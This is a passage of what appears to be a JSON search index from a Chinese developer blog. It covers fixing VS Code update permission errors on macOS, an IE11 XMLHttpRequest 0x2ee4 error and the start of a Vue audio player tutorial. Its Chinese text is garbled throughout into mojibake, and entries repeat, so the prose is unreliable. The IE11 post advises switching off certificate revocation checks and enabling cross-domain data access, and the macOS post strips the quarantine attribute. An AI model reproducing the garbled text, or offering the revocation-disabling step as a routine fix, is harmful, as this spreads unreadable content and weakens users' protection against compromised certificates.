com.microsoft.VSCode.ShipIt 2. è§£å†³æ–¹æ³• æ³¨æ„ï¼š å…ˆæŠŠvscode å®Œå…¨å…³é—­\n// 1. è¿™ä¸€æ­¥æ˜¯éœ€è¦è¾“å…¥å¯†ç çš„ sudo chown $USER ~/Library/Caches/com.microsoft.VSCode.ShipIt/ // 2. è¿™ä¸€æ­¥æ˜¯ä¸éœ€è¦è¾“å…¥å¯†ç çš„, å¦‚æœä¸è¿›è¡Œç¬¬ä¸€æ­¥ï¼Œç¬¬äºŒæ­¥ä¼šæŠ¥é”™ sudo chown $USER ~/Library/Caches/com.microsoft.VSCode.ShipIt/* // 3. æ›´æ–°xattr xattr -dr com.apple.quarantine /Applications/Visual\\ Studio\\ Code.app 3. æ‰“å¼€vscode Code \u0026gt; Check for Updates, ç‚¹å‡»ä¹‹åï¼Œä½ ä¼šå‘ç°Check for Updateså·²ç»å˜æˆç°è‰²äº†ï¼Œé‚£ä¹ˆä½ éœ€è¦ç¨ç­‰ç‰‡åˆ»ï¼Œé©¬ä¸Šå°±å¯ä»¥æ›´æ–°ï¼Œä¹‹åä¼šè·³å‡ºæç¤ºï¼Œè®©ä½ é‡å¯vscode, ç„¶åé‡å¯ä¸€ä¸‹vscode, å°±okäº†ã€‚\n4. å‚è€ƒ joaomoreno commented on Feb 7, 2017 â€¢ edited ","permalink":"https://wdd.js.org/posts/2018/02/mac-vscode-update-permission-denied/","summary":"0. ç°è±¡ Could not create temporary directory: Permission denied\n1. é—®é¢˜èµ·å›  åœ¨ /Users/username/Library/Caches/ç›®å½•ä¸‹ï¼Œæœ‰ä»¥ä¸‹ä¸¤ä¸ªæ–‡ä»¶ï¼Œ å¯ä»¥çœ‹åˆ°ï¼Œä»–ä»¬ä¸¤ä¸ªçš„ç”¨æˆ·æ˜¯ä¸ä¸€æ ·çš„ï¼Œä¸€ä¸ªæ˜¯rootä¸€ä¸ªusername, ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘æ˜¯ä»¥usernameæ¥ä½¿ç”¨æˆ‘çš„macçš„ã€‚å°±æ˜¯å› ä¸ºè¿™ä¸¤ä¸ªæ–‡ä»¶çš„ç”¨æˆ·ä¸ä¸€æ ·ï¼Œå¯¼è‡´äº†æ›´æ–°å¤±è´¥ã€‚\ndrwxr-xr-x 6 username staff 204B Jan 17 20:33 com.microsoft.VSCode drwxr--r-- 2 root staff 68B Dec 17 13:51 com.microsoft.VSCode.ShipIt 2. è§£å†³æ–¹æ³• æ³¨æ„ï¼š å…ˆæŠŠvscode å®Œå…¨å…³é—­\n// 1. è¿™ä¸€æ­¥æ˜¯éœ€è¦è¾“å…¥å¯†ç çš„ sudo chown $USER ~/Library/Caches/com.microsoft.VSCode.ShipIt/ // 2. è¿™ä¸€æ­¥æ˜¯ä¸éœ€è¦è¾“å…¥å¯†ç çš„, å¦‚æœä¸è¿›è¡Œç¬¬ä¸€æ­¥ï¼Œç¬¬äºŒæ­¥ä¼šæŠ¥é”™ sudo chown $USER ~/Library/Caches/com.microsoft.VSCode.ShipIt/* // 3. æ›´æ–°xattr xattr -dr com.apple.quarantine /Applications/Visual\\ Studio\\ Code.app 3. æ‰“å¼€vscode Code \u0026gt; Check for Updates, ç‚¹å‡»ä¹‹åï¼Œä½ ä¼šå‘ç°Check for Updateså·²ç»å˜æˆç°è‰²äº†ï¼Œé‚£ä¹ˆä½ éœ€è¦ç¨ç­‰ç‰‡åˆ»ï¼Œé©¬ä¸Šå°±å¯ä»¥æ›´æ–°ï¼Œä¹‹åä¼šè·³å‡ºæç¤ºï¼Œè®©ä½ é‡å¯vscode, ç„¶åé‡å¯ä¸€ä¸‹vscode, å°±okäº†ã€‚","title":"mac vscode æ›´æ–°å¤±è´¥ Permission deniedè§£å†³åŠæ³•"},{"content":"ä¸€åƒä¸ªIEæµè§ˆå™¨è®¿é—®åŒä¸€ä¸ªé¡µé¢ï¼Œå¯èƒ½æŠ¥ä¸€åƒç§é”™è¯¯ã€‚å‰ç«¯æ¿€è¿›æ´¾å¯¹IEæ¨å¾—ç‰™ç—’ç—’ï¼Œä½†æ˜¯æ— è®ºä½ çˆ±ï¼Œæˆ–è€…ä¸çˆ±ï¼ŒIEå°±åœ¨é‚£é‡Œï¼Œä¸æ¥ä¸å»ã€‚\nä¸€äº›é“¶è¡Œï¼Œä»¥åŠæ”¿åºœéƒ¨é—¨ï¼Œå¾€å¾€éƒ½æ˜¯æŒ‡å®šå¿…é¡»ä½¿ç”¨IEæµè§ˆå™¨ã€‚æ‰€ä»¥ï¼Œä¸€äº›ä»…åœ¨IEæµè§ˆå™¨ä¸Šå‡ºç°çš„é—®é¢˜ã€‚æ€»ç»“èµ·æ¥é—®é¢˜çš„åŸå› å¾ˆç®€å•ï¼šIEçš„é…ç½®ä¸æ­£ç¡®\nä¸‹é¢å°±å°†ä¸€ä¸ªæˆ‘æ›¾ç»é‡åˆ°çš„é—®é¢˜: IE11 0x2ee4ï¼Œ ä»¥åŠå…¶ä»–çš„é—®é¢˜çš„è§£å†³æ–¹æ¡ˆ\n1. IE11 SCRIPT7002: XMLHttpRequest: ç½‘ç»œé”™è¯¯ 0x2ee4 èƒŒæ™¯ä»‹ç»ï¼šåœ¨ä¸€ä¸ªHTTPSåŸŸå‘å¦å¤–ä¸€ä¸ªHTTPSåŸŸå‘é€è·¨åŸŸPOTSTè¯·æ±‚æ—¶\nè¿™ä¸ªé—®é¢˜åœ¨æµè§ˆå™¨çš„è¾“å‡ºå†…å®¹å¦‚ä¸‹ï¼Œæ€ªå¼‚çš„æ˜¯ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰IE11éƒ½ä¼šæŠ¥è¿™ä¸ªé”™è¯¯ã€‚\nSCRIPT7002: XMLHttpRequest: ç½‘ç»œé”™è¯¯ 0x2ee4, ç”±äºå‡ºç°é”™è¯¯ 00002ee4 è€Œå¯¼è‡´æ­¤é¡¹æ“ä½œæ— æ³•å®Œæˆ stackoverflowä¸Šæœ‰ä¸ªç­”æ¡ˆï¼Œå®ƒçš„æ€è·¯æ˜¯ï¼šåœ¨postè¯·æ±‚å‘é€ä¹‹å‰ï¼Œå…ˆè¿›è¡Œä¸€æ¬¡getæ“ä½œ è¿™ä¸ªæ–¹å¼æˆ‘è¯•è¿‡ï¼Œæ˜¯å¯è¡Œçš„ã€‚ä½†æ˜¯æ·±å±‚æ¬¡çš„åŸå› æˆ‘ä¸æ˜¯å¾ˆæ˜ç™½ã€‚\nç„¶è€ŒçœŸç›¸æ€»æœ‰å¤§ç™½çš„ä¸€å¤©ï¼Œå…¶å®æ·±å±‚æ¬¡çš„åŸå› æ˜¯ï¼ŒIE11çš„é…ç½®ã€‚\nå»æ‰æ£€æŸ¥è¯ä¹¦åŠé”€çš„çš„æ£€æŸ¥ï¼Œè§£å†³0x2ee4çš„é—®é¢˜\nè§£å†³æ–¹æ³•\nå»æ‰check for server certificate revocation*ï¼Œ ä¹Ÿæœ‰å¯èƒ½ä½ é‚£è¾¹æ˜¯ä¸­æ–‡ç¿»è¯‘çš„ï¼šå«æ£€æŸ¥æœåŠ¡å™¨è¯ä¹¦æ˜¯å¦å·²åŠé”€ å»æ‰æ£€æŸ¥å‘å‹å•†è¯ä¹¦æ˜¯å¦å·²åŠé”€ ç‚¹å‡»ç¡®å®š é‡å¯è®¡ç®—æœº 2 å…¶ä»–å¸¸è§„è®¾ç½® 2.1 å»æ‰å…¼å®¹æ¨¡å¼ï¼Œ ä½¿ç”¨Edgeæ–‡æ¡£æ¨¡å¼ ä¸‹å›¾ä¸­çº¢è‰²æ¡†é‡Œçš„æŒ‰é’®ä¹Ÿè¦å–æ¶ˆå‹¾é€‰ 2.2 æœ‰äº›ä½¿ç”¨activeXï¼Œè¿˜æ˜¯éœ€è¦æ£€æŸ¥æ˜¯å¦å¯ç”¨çš„ 2.3 å…è®¸è·¨åŸŸ å¦‚æœä½ çš„æ¥å£è·¨åŸŸäº†ï¼Œè¿˜è¦æ£€æŸ¥æµè§ˆå™¨æ˜¯å¦å…è®¸è·¨åŸŸï¼Œå¦åˆ™æµè§ˆå™¨å¯èƒ½é»˜è®¤å°±ç¦æ­¢è·¨åŸŸçš„\nè®¾ç½®æ–¹æ³•\ninterneté€‰é¡¹ å®‰å…¨ è‡ªå®šä¹‰çº§åˆ« å¯ç”¨é€šè¿‡è·¨åŸŸè®¿é—®æ•°æ®æº å¯ç”¨è·¨åŸŸæµè§ˆçª—å£å’Œæ¡†æ¶ ç¡®å®š ç„¶åé‡å¯ç”µè„‘ ","permalink":"https://wdd.js.org/posts/2018/02/ie11-0x2ee4-bug/","summary":"ä¸€åƒä¸ªIEæµè§ˆå™¨è®¿é—®åŒä¸€ä¸ªé¡µé¢ï¼Œå¯èƒ½æŠ¥ä¸€åƒç§é”™è¯¯ã€‚å‰ç«¯æ¿€è¿›æ´¾å¯¹IEæ¨å¾—ç‰™ç—’ç—’ï¼Œä½†æ˜¯æ— è®ºä½ çˆ±ï¼Œæˆ–è€…ä¸çˆ±ï¼ŒIEå°±åœ¨é‚£é‡Œï¼Œä¸æ¥ä¸å»ã€‚\nä¸€äº›é“¶è¡Œï¼Œä»¥åŠæ”¿åºœéƒ¨é—¨ï¼Œå¾€å¾€éƒ½æ˜¯æŒ‡å®šå¿…é¡»ä½¿ç”¨IEæµè§ˆå™¨ã€‚æ‰€ä»¥ï¼Œä¸€äº›ä»…åœ¨IEæµè§ˆå™¨ä¸Šå‡ºç°çš„é—®é¢˜ã€‚æ€»ç»“èµ·æ¥é—®é¢˜çš„åŸå› å¾ˆç®€å•ï¼šIEçš„é…ç½®ä¸æ­£ç¡®\nä¸‹é¢å°±å°†ä¸€ä¸ªæˆ‘æ›¾ç»é‡åˆ°çš„é—®é¢˜: IE11 0x2ee4ï¼Œ ä»¥åŠå…¶ä»–çš„é—®é¢˜çš„è§£å†³æ–¹æ¡ˆ\n1. IE11 SCRIPT7002: XMLHttpRequest: ç½‘ç»œé”™è¯¯ 0x2ee4 èƒŒæ™¯ä»‹ç»ï¼šåœ¨ä¸€ä¸ªHTTPSåŸŸå‘å¦å¤–ä¸€ä¸ªHTTPSåŸŸå‘é€è·¨åŸŸPOTSTè¯·æ±‚æ—¶\nè¿™ä¸ªé—®é¢˜åœ¨æµè§ˆå™¨çš„è¾“å‡ºå†…å®¹å¦‚ä¸‹ï¼Œæ€ªå¼‚çš„æ˜¯ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰IE11éƒ½ä¼šæŠ¥è¿™ä¸ªé”™è¯¯ã€‚\nSCRIPT7002: XMLHttpRequest: ç½‘ç»œé”™è¯¯ 0x2ee4, ç”±äºå‡ºç°é”™è¯¯ 00002ee4 è€Œå¯¼è‡´æ­¤é¡¹æ“ä½œæ— æ³•å®Œæˆ stackoverflowä¸Šæœ‰ä¸ªç­”æ¡ˆï¼Œå®ƒçš„æ€è·¯æ˜¯ï¼šåœ¨postè¯·æ±‚å‘é€ä¹‹å‰ï¼Œå…ˆè¿›è¡Œä¸€æ¬¡getæ“ä½œ è¿™ä¸ªæ–¹å¼æˆ‘è¯•è¿‡ï¼Œæ˜¯å¯è¡Œçš„ã€‚ä½†æ˜¯æ·±å±‚æ¬¡çš„åŸå› æˆ‘ä¸æ˜¯å¾ˆæ˜ç™½ã€‚\nç„¶è€ŒçœŸç›¸æ€»æœ‰å¤§ç™½çš„ä¸€å¤©ï¼Œå…¶å®æ·±å±‚æ¬¡çš„åŸå› æ˜¯ï¼ŒIE11çš„é…ç½®ã€‚\nå»æ‰æ£€æŸ¥è¯ä¹¦åŠé”€çš„çš„æ£€æŸ¥ï¼Œè§£å†³0x2ee4çš„é—®é¢˜\nè§£å†³æ–¹æ³•\nå»æ‰check for server certificate revocation*ï¼Œ ä¹Ÿæœ‰å¯èƒ½ä½ é‚£è¾¹æ˜¯ä¸­æ–‡ç¿»è¯‘çš„ï¼šå«æ£€æŸ¥æœåŠ¡å™¨è¯ä¹¦æ˜¯å¦å·²åŠé”€ å»æ‰æ£€æŸ¥å‘å‹å•†è¯ä¹¦æ˜¯å¦å·²åŠé”€ ç‚¹å‡»ç¡®å®š é‡å¯è®¡ç®—æœº 2 å…¶ä»–å¸¸è§„è®¾ç½® 2.1 å»æ‰å…¼å®¹æ¨¡å¼ï¼Œ ä½¿ç”¨Edgeæ–‡æ¡£æ¨¡å¼ ä¸‹å›¾ä¸­çº¢è‰²æ¡†é‡Œçš„æŒ‰é’®ä¹Ÿè¦å–æ¶ˆå‹¾é€‰ 2.2 æœ‰äº›ä½¿ç”¨activeXï¼Œè¿˜æ˜¯éœ€è¦æ£€æŸ¥æ˜¯å¦å¯ç”¨çš„ 2.3 å…è®¸è·¨åŸŸ å¦‚æœä½ çš„æ¥å£è·¨åŸŸäº†ï¼Œè¿˜è¦æ£€æŸ¥æµè§ˆå™¨æ˜¯å¦å…è®¸è·¨åŸŸï¼Œå¦åˆ™æµè§ˆå™¨å¯èƒ½é»˜è®¤å°±ç¦æ­¢è·¨åŸŸçš„\nè®¾ç½®æ–¹æ³•\ninterneté€‰é¡¹ å®‰å…¨ è‡ªå®šä¹‰çº§åˆ« å¯ç”¨é€šè¿‡è·¨åŸŸè®¿é—®æ•°æ®æº å¯ç”¨è·¨åŸŸæµè§ˆçª—å£å’Œæ¡†æ¶ ç¡®å®š ç„¶åé‡å¯ç”µè„‘ ","title":"IE11 0x2ee4 bug ä»¥åŠç±»ä¼¼é—®é¢˜è§£å†³æ–¹æ³•"},{"content":"1. ç®€ä»‹ 1.1. ç›¸å…³æŠ€æœ¯ Vue Vue-cli ElementUI yarn (ä¹‹å‰æˆ‘ç”¨npm, å¹¶ä½¿ç”¨cnpmçš„æºï¼Œä½†æ˜¯ç”¨äº†yarnä¹‹åï¼Œæˆ‘å‘ç°å®ƒæ¯”cnpmçš„é€Ÿåº¦è¿˜å¿«ï¼ŒåŠŸèƒ½æ›´å¥½ï¼Œæˆ‘å°±æ¯«ä¸çŠ¹è±«é€‰æ‹©yarnäº†) Audioç›¸å…³APIå’Œäº‹ä»¶ 1.2. ä»æœ¬æ•™ç¨‹ä½ ä¼šå­¦åˆ°ä»€ä¹ˆï¼Ÿ Vueå•æ–‡ä»¶ç»„ä»¶å¼€å‘çŸ¥è¯† Element UIåŸºæœ¬ç”¨æ³• AudioåŸç”ŸAPIåŠAudioç›¸å…³äº‹ä»¶ éŸ³é¢‘æ’­æ”¾å™¨çš„åŸºæœ¬åŸç† éŸ³é¢‘çš„æ’­æ”¾æš‚åœæ§åˆ¶ æ›´æ–°éŸ³é¢‘æ˜¾ç¤ºæ—¶é—´ éŸ³é¢‘è¿›åº¦æ¡æ§åˆ¶ä¸è·³è½¬ éŸ³é¢‘éŸ³é‡æ§åˆ¶ éŸ³é¢‘æ’­æ”¾é€Ÿåº¦æ§åˆ¶ éŸ³é¢‘é™éŸ³æ§åˆ¶ éŸ³é¢‘ä¸‹è½½æ§åˆ¶ ä¸ªæ€§åŒ–é…ç½®ä¸æ’ä»–æ€§æ’­æ”¾ ä¸€ç‚¹ç‚¹ES6è¯­æ³• 2. å­¦å‰å‡†å¤‡ åŸºæœ¬ä¸Šä¸éœ€è¦ä»€ä¹ˆå‡†å¤‡ï¼Œä½†æ˜¯å¦‚æœä½ èƒ½å…ˆçœ‹ä¸€ä¸‹Aduioç›¸å…³APIå’Œäº‹ä»¶å°†ä¼šæ›´å¥½\nAudio: å¦‚æœä½ æ„¿æ„ä¸€å±‚ä¸€å±‚å‰¥å¼€æˆ‘çš„å¿ƒ ä½¿ç”¨ HTML5 éŸ³é¢‘å’Œè§†é¢‘ 3. åœ¨çº¿demon æ²¡æœ‰åœ¨çº¿demoçš„æ•™ç¨‹éƒ½æ˜¯è€æµæ°“\næŸ¥çœ‹åœ¨çº¿demon é¡¹ç›®åœ°å€ 4. å¼€å§‹ç¼–ç  5. é¡¹ç›®åˆå§‹åŒ– âœ test vue init webpack element-audio A newer version of vue-cli is available. latest: 2.9.2 installed: 2.9.1 ? Project name element-audio ? Project description A Vue.js project ? Author wangdd \u0026lt;wangdd@xxxxxx.com\u0026gt; ? Vue build standalone ? Install vue-router? No ? Use ESLint to lint your code? No ? Set up unit tests No ? Setup e2e tests with Nightwatch? No ? Should we run `npm install` for you after the project has been created? (recommended) npm âœ test cd element-audio âœ element-audio npm run dev æµè§ˆå™¨æ‰“å¼€ http://localhost:8080/, çœ‹åˆ°å¦‚ä¸‹ç•Œé¢ï¼Œè¯´æ˜é¡¹ç›®åˆå§‹åŒ–æˆåŠŸ\n5.1. å®‰è£…ElementUIå¹¶æ’å…¥audioæ ‡ç­¾ 5.1.1. å®‰è£…ElementUI yarn add element-ui // or npm i element-ui -S 5.1.2. åœ¨src/main.jsä¸­å¼•å…¥Element UI // filename: src/main.js import Vue from \u0026#39;vue\u0026#39; import ElementUI from \u0026#39;element-ui\u0026#39; import App from \u0026#39;./App\u0026#39; import \u0026#39;element-ui/lib/theme-chalk/index.css\u0026#39; Vue.config.productionTip = false Vue.use(ElementUI) /* eslint-disable no-new */ new Vue({ el: \u0026#39;#app\u0026#39;, template: \u0026#39;\u0026lt;App/\u0026gt;\u0026#39;, components: { App } }) 5.1.3. åˆ›å»ºsrc/components/VueAudio.vue // filename: src/components/VueAudio.vue \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;audio src=\u0026#34;http://devtest.qiniudn.com/secret base~.mp3\u0026#34; controls=\u0026#34;controls\u0026#34;\u0026gt;\u0026lt;/audio\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; export default { data () { return {} } } \u0026lt;/script\u0026gt; \u0026lt;style\u0026gt; \u0026lt;/style\u0026gt; 5.1.4. ä¿®æ”¹src/App.vue, å¹¶å¼•å…¥VueAudio.vueç»„ä»¶ // filename: src/App.vue \u0026lt;template\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;VueAudio /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import VueAudio from \u0026#39;./components/VueAudio\u0026#39; export default { name: \u0026#39;app\u0026#39;, components: { VueAudio }, data () { return {} } } \u0026lt;/script\u0026gt; \u0026lt;style\u0026gt; \u0026lt;/style\u0026gt; æ‰“å¼€ï¼šhttp://localhost:8080/ï¼Œä½ åº”è¯¥èƒ½çœ‹åˆ°å¦‚ä¸‹æ•ˆæœï¼Œè¯´æ˜å¼•å…¥æˆåŠŸï¼Œä½ å¯ä»¥ç‚¹å‡»æ’­æ”¾æŒ‰é’®çœ‹çœ‹ï¼ŒéŸ³é¢‘æ˜¯å¦èƒ½å¤Ÿæ’­æ”¾ 5.2. éŸ³é¢‘çš„æ’­æ”¾æš‚åœæ§åˆ¶ æˆ‘ä»¬éœ€è¦ç”¨ä¸€ä¸ªæŒ‰é’®å»æ§åˆ¶éŸ³é¢‘çš„æ’­æ”¾ä¸æš‚åœï¼Œè¿™é‡Œè°ƒç”¨äº†audioçš„ä¸¤ä¸ªapi,ä»¥åŠä¸¤ä¸ªäº‹ä»¶\naudio.play() audio.pause() playäº‹ä»¶ pauseäº‹ä»¶ ä¿®æ”¹src/components/VueAudio.vue\n// filename: src/components/VueAudio.vue \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;!-- æ­¤å¤„çš„refå±æ€§ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„åœ¨vueç»„ä»¶ä¸­é€šè¿‡ this.$refs.audioè·å–è¯¥domå…ƒç´  --\u0026gt; \u0026lt;audio ref=\u0026#34;audio\u0026#34; @pause=\u0026#34;onPause\u0026#34; @play=\u0026#34;onPlay\u0026#34; src=\u0026#34;http://devtest.qiniudn.com/secret base~.mp3\u0026#34; controls=\u0026#34;controls\u0026#34;\u0026gt;\u0026lt;/audio\u0026gt; \u0026lt;!-- éŸ³é¢‘æ’­æ”¾æ§ä»¶ --\u0026gt; \u0026lt;div\u0026gt; \u0026lt;el-button type=\u0026#34;text\u0026#34; @click=\u0026#34;startPlayOrPause\u0026#34;\u0026gt;{{audio.playing | transPlayPause}}\u0026lt;/el-button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; export default { data () { return { audio: { // è¯¥å­—æ®µæ˜¯éŸ³é¢‘æ˜¯å¦å¤„äºæ’­æ”¾çŠ¶æ€çš„å±æ€§ playing: false } } }, methods: { // æ§åˆ¶éŸ³é¢‘çš„æ’­æ”¾ä¸æš‚åœ startPlayOrPause () { return this.audio.playing ? this.pause() : this.play() }, // æ’­æ”¾éŸ³é¢‘ play () { this.$refs.audio.play() }, // æš‚åœéŸ³é¢‘ pause () { this.$refs.audio.pause() }, // å½“éŸ³é¢‘æ’­æ”¾ onPlay () { this.audio.playing = true }, // å½“éŸ³é¢‘æš‚åœ onPause () { this.audio.playing = false } }, filters: { // ä½¿ç”¨ç»„ä»¶è¿‡æ»¤å™¨æ¥åŠ¨æ€æ”¹å˜æŒ‰é’®çš„æ˜¾ç¤º transPlayPause(value) { return value ? \u0026#39;æš‚åœ\u0026#39; : \u0026#39;æ’­æ”¾\u0026#39; } } } \u0026lt;/script\u0026gt; \u0026lt;style\u0026gt; \u0026lt;/style\u0026gt; 5.3. éŸ³é¢‘æ˜¾ç¤ºæ—¶é—´ éŸ³é¢‘çš„æ—¶é—´æ˜¾ç¤ºä¸»è¦æœ‰ä¸¤éƒ¨åˆ†ï¼ŒéŸ³é¢‘çš„æ€»æ—¶é•¿å’Œå½“å‰æ’­æ”¾æ—¶é—´ã€‚å¯ä»¥ä»ä¸¤ä¸ªäº‹ä»¶ä¸­è·å–\nloadedmetadata:ä»£è¡¨éŸ³é¢‘çš„å…ƒæ•°æ®å·²ç»è¢«åŠ è½½å®Œæˆï¼Œå¯ä»¥ä»ä¸­è·å–éŸ³é¢‘æ€»æ—¶é•¿ timeupdate: å½“å‰æ’­æ”¾ä½ç½®ä½œä¸ºæ­£å¸¸æ’­æ”¾çš„ä¸€éƒ¨åˆ†è€Œæ”¹å˜ï¼Œæˆ–è€…ä»¥ç‰¹åˆ«æœ‰è¶£çš„æ–¹å¼ï¼Œä¾‹å¦‚ä¸è¿ç»­åœ°æ”¹å˜ï¼Œå¯ä»¥ä»è¯¥äº‹ä»¶ä¸­è·å–éŸ³é¢‘çš„å½“å‰æ’­æ”¾æ—¶é—´ï¼Œè¯¥äº‹ä»¶åœ¨æ’­æ”¾è¿‡ç¨‹ä¸­ä¼šä¸æ–­è¢«è§¦å‘ è¦ç‚¹ä»£ç ï¼šæ•´æ•°æ ¼å¼åŒ–æˆæ—¶:åˆ†:ç§’\nfunction realFormatSecond(second) { var secondType = typeof second if (secondType === \u0026#39;number\u0026#39; || secondType === \u0026#39;string\u0026#39;) { second = parseInt(second) var hours = Math.floor(second / 3600) second = second - hours * 3600 var mimute = Math.floor(second / 60) second = second - mimute * 60 return hours + \u0026#39;:\u0026#39; + (\u0026#39;0\u0026#39; + mimute).slice(-2) + \u0026#39;:\u0026#39; + (\u0026#39;0\u0026#39; + second).slice(-2) } else { return \u0026#39;0:00:00\u0026#39; } } è¦ç‚¹ä»£ç ï¼š ä¸¤ä¸ªäº‹ä»¶çš„å¤„ç†\n// å½“timeupdateäº‹ä»¶å¤§æ¦‚æ¯ç§’ä¸€æ¬¡ï¼Œç”¨æ¥æ›´æ–°éŸ³é¢‘æµçš„å½“å‰æ’­æ”¾æ—¶é—´ onTimeupdate(res) { console.log(\u0026#39;timeupdate\u0026#39;) console.log(res) this.audio.currentTime = res.target.currentTime }, // å½“åŠ è½½è¯­éŸ³æµå…ƒæ•°æ®å®Œæˆåï¼Œä¼šè§¦å‘è¯¥äº‹ä»¶çš„å›è°ƒå‡½æ•° // è¯­éŸ³å…ƒæ•°æ®ä¸»è¦æ˜¯è¯­éŸ³çš„é•¿åº¦ä¹‹ç±»çš„æ•°æ® onLoadedmetadata(res) { console.log(\u0026#39;loadedmetadata\u0026#39;) console.log(res) this.audio.maxTime = parseInt(res.target.duration) } å®Œæ•´ä»£ç \n\u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;!-- æ­¤å¤„çš„refå±æ€§ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„åœ¨vueç»„ä»¶ä¸­é€šè¿‡ this.$refs.audioè·å–è¯¥domå…ƒç´  --\u0026gt; \u0026lt;audio ref=\u0026#34;audio\u0026#34; @pause=\u0026#34;onPause\u0026#34; @play=\u0026#34;onPlay\u0026#34; @timeupdate=\u0026#34;onTimeupdate\u0026#34; @loadedmetadata=\u0026#34;onLoadedmetadata\u0026#34; src=\u0026#34;http://devtest.qiniudn.com/secret base~.mp3\u0026#34; controls=\u0026#34;controls\u0026#34;\u0026gt;\u0026lt;/audio\u0026gt; \u0026lt;!-- éŸ³é¢‘æ’­æ”¾æ§ä»¶ --\u0026gt; \u0026lt;div\u0026gt; \u0026lt;el-button type=\u0026#34;text\u0026#34; @click=\u0026#34;startPlayOrPause\u0026#34;\u0026gt;{{audio.playing | transPlayPause}}\u0026lt;/el-button\u0026gt; \u0026lt;el-tag type=\u0026#34;info\u0026#34;\u0026gt;{{ audio.currentTime | formatSecond}}\u0026lt;/el-tag\u0026gt; \u0026lt;el-tag type=\u0026#34;info\u0026#34;\u0026gt;{{ audio.maxTime | formatSecond}}\u0026lt;/el-tag\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; // å°†æ•´æ•°è½¬æ¢æˆ æ—¶ï¼šåˆ†ï¼šç§’çš„æ ¼å¼ function realFormatSecond(second) { var secondType = typeof second if (secondType === \u0026#39;number\u0026#39; || secondType === \u0026#39;string\u0026#39;) { second = parseInt(second) var hours = Math.floor(second / 3600) second = second - hours * 3600 var mimute = Math.floor(second / 60) second = second - mimute * 60 return hours + \u0026#39;:\u0026#39; + (\u0026#39;0\u0026#39; + mimute).slice(-2) + \u0026#39;:\u0026#39; + (\u0026#39;0\u0026#39; + second).slice(-2) } else { return \u0026#39;0:00:00\u0026#39; } } export default { data () { return { audio: { // è¯¥å­—æ®µæ˜¯éŸ³é¢‘æ˜¯å¦å¤„äºæ’­æ”¾çŠ¶æ€çš„å±æ€§ playing: false, // éŸ³é¢‘å½“å‰æ’­æ”¾æ—¶é•¿ currentTime: 0, // éŸ³é¢‘æœ€å¤§æ’­æ”¾æ—¶é•¿ maxTime: 0 } } }, methods: { // æ§åˆ¶éŸ³é¢‘çš„æ’­æ”¾ä¸æš‚åœ startPlayOrPause () { return this.audio.playing ? this.pause() : this.play() }, // æ’­æ”¾éŸ³é¢‘ play () { this.$refs.audio.play() }, // æš‚åœéŸ³é¢‘ pause () { this.$refs.audio.pause() }, // å½“éŸ³é¢‘æ’­æ”¾ onPlay () { this.audio.playing = true }, // å½“éŸ³é¢‘æš‚åœ onPause () { this.audio.playing = false }, // å½“timeupdateäº‹ä»¶å¤§æ¦‚æ¯ç§’ä¸€æ¬¡ï¼Œç”¨æ¥æ›´æ–°éŸ³é¢‘æµçš„å½“å‰æ’­æ”¾æ—¶é—´ onTimeupdate(res) { console.log(\u0026#39;timeupdate\u0026#39;) console.log(res) this.audio.currentTime = res.target.currentTime }, // å½“åŠ è½½è¯­éŸ³æµå…ƒæ•°æ®å®Œæˆåï¼Œä¼šè§¦å‘è¯¥äº‹ä»¶çš„å›è°ƒå‡½æ•° // è¯­éŸ³å…ƒæ•°æ®ä¸»è¦æ˜¯è¯­éŸ³çš„é•¿åº¦ä¹‹ç±»çš„æ•°æ® onLoadedmetadata(res) { console.log(\u0026#39;loadedmetadata\u0026#39;) console.log(res) this.audio.maxTime = parseInt(res.target.duration) } }, filters: { // ä½¿ç”¨ç»„ä»¶è¿‡æ»¤å™¨æ¥åŠ¨æ€æ”¹å˜æŒ‰é’®çš„æ˜¾ç¤º transPlayPause(value) { return value ? \u0026#39;æš‚åœ\u0026#39; : \u0026#39;æ’­æ”¾\u0026#39; }, // å°†æ•´æ•°è½¬åŒ–æˆæ—¶åˆ†ç§’ formatSecond(second = 0) { return realFormatSecond(second) } } } \u0026lt;/script\u0026gt; \u0026lt;style\u0026gt; \u0026lt;/style\u0026gt; æ‰“å¼€æµè§ˆå™¨å¯ä»¥çœ‹åˆ°ï¼Œå½“éŸ³é¢‘æ’­æ”¾æ—¶ï¼Œå½“å‰æ—¶é—´ä¹Ÿåœ¨æ”¹å˜ã€‚ 5.4. éŸ³é¢‘è¿›åº¦æ¡æ§åˆ¶ è¿›åº¦æ¡ä¸»è¦æœ‰ä¸¤ä¸ªæ§åˆ¶ï¼Œæ”¹å˜è¿›åº¦çš„åŸç†æ˜¯ï¼šæ”¹å˜audio.currentTimeå±æ€§å€¼\néŸ³é¢‘æ’­æ”¾åï¼Œå½“å‰æ—¶é—´æ”¹å˜ï¼Œè¿›åº¦æ¡å°±è¦éšä¹‹æ”¹å˜ æ‹–åŠ¨è¿›åº¦æ¡ï¼Œå¯ä»¥æ”¹å˜éŸ³é¢‘çš„å½“å‰æ—¶é—´ // è¿›åº¦æ¡ui \u0026lt;el-slider v-model=\u0026#34;sliderTime\u0026#34; :format-tooltip=\u0026#34;formatProcessToolTip\u0026#34; @change=\u0026#34;changeCurrentTime\u0026#34; class=\u0026#34;slider\u0026#34;\u0026gt;\u0026lt;/el-slider\u0026gt; // 